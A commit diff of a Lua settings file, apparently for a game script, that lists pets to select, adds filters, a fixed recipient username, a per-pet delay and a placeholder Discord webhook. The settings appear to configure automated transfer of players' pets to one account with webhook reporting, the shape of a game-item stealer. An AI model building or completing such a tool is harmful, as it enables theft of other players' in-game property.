1ddd09b440d1a31248dbeb38831df9c26f1c4aed
unblock-eve <coke@dr.com>
2025-06-17 05:36:52 -0500

    Update SETTINGS.lua

--- SETTINGS.lua
+++ SETTINGS.lua
@@ -1,9 +1,18 @@
-local ALLOWED_NAMES = {
-	["tarantula hawk"] = true,
-	["bee"]            = true,
-	["moth"]       = true,
-	["queen bee"]         = true,
-	["grey mouse"]         = true,
-	["racoon"]         = true,
-	["brown mouse"]         = true,
+return {
+    ENABLE_AGE_FILTER    = false,
+    ENABLE_WEIGHT_FILTER = false,
+    MIN_AGE              = 20,
+    MIN_WEIGHT           = 1.0,
+    ALLOWED_NAMES = {
+        ["tarantula hawk"] = true,
+        ["bee"]            = true,
+        ["moth"]           = true,
+        ["queen bee"]      = true,
+        ["grey mouse"]     = true,
+        ["racoon"]         = true,
+        ["brown mouse"]    = true,
+    },
+    RECIPIENT_USERNAME = "boogaworker1",
+    DELAY_BETWEEN_PETS = 0.3,
+    WEBHOOK_URL = "https://discord.com/api/webhooks/your-webhook-url"
 }
